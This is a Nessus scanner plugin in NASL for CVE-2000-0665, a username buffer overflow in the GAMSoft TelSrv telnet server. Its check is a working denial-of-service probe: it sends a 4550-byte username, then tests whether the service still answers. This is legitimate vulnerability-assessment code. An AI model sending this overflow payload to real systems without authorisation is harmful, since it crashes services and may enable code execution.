#
# This script was written by Prizm <Prizm@RESENTMENT.org>
#
# See the Nessus Scripts License for details
#
# Changes by Tenable:
# - description changed somehow [RD]
# - handles the fact that the shareware may not be registered [RD]
# - revised plugin title (6/16/09)
# - changed family (6/28/09)

include("compat.inc");

if (description)
{
  script_id(10474);
  script_version("$Revision: 1.31 $");
  script_cvs_date("$Date: 2016/11/03 20:40:06 $");

  script_cve_id("CVE-2000-0665");
  script_bugtraq_id(1478);
  script_osvdb_id(373);

  script_name(english:"GAMSoft TelSrv 1.4/1.5 Username Overflow DoS");
  script_summary(english:"Crash GAMSoft TelSrv telnet server.");

  script_set_attribute(attribute:"synopsis", value:"The remote telnet server has a buffer overflow vulnerability.");
  script_set_attribute(attribute:"description", value:
"It is possible to crash the remote telnet server by sending a username
that is 4550 characters or longer. A remote attacker could exploit
this to crash the service, or potentially execute arbitrary code.");
  #https://web.archive.org/web/20000819132410/http://archives.neohapsis.com/archives/ntbugtraq/2000-q3/0031.html
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?2999867b");
  script_set_attribute(attribute:"solution", value:"There is no known solution at this time.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"metasploit_name", value:'GAMSoft TelSrv 1.5 Username Buffer Overflow');
  script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2000/07/17");
  script_set_attribute(attribute:"plugin_publication_date", value:"2000/07/17");

  script_set_attribute(attribute:"potential_vulnerability", value:"true");
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_end_attributes();

  script_category(ACT_DENIAL);
  script_copyright(english:"This script is Copyright (C) 2000-2016 Prizm <Prizm@RESENTMENT.org");
  script_family(english:"Windows");

  script_dependencie("telnetserver_detect_type_nd_version.nasl");
  script_require_keys("Settings/ParanoidReport");
  script_require_ports("Services/telnet", 23);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("telnet_func.inc");

if (report_paranoia < 2) audit(AUDIT_PARANOID);

port = get_service(svc:"telnet", default: 23, exit_on_fail: 1);

soc = open_sock_tcp(port);
if (! soc) exit(1);

  r = telnet_negotiate(socket:soc);
  r2 = recv(socket:soc, length:4096);
  r = r + r2;
if(r)
{
  r = recv(socket:soc, length:8192);
  if("5 second delay" >< r)sleep(5);
  r = recv(socket:soc, length:8192);
  req = string(crap(4550), "\r\n");
  send(socket:soc, data:req);
  close(soc);
  sleep(1);

  soc2 = open_sock_tcp(port);
  if(!soc2)
  {
    if (service_is_dead(port: port, exit: 0) <= 0)
      exit(1, "Could not reconnect to port "+port+".");
    security_hole(port);
  }
  else {
        r = telnet_negotiate(socket:soc2);
	r2 = recv(socket:soc2, length:4096);
	r = r + r2;
        close(soc2);
        if(!r)security_hole(port);
      }
}


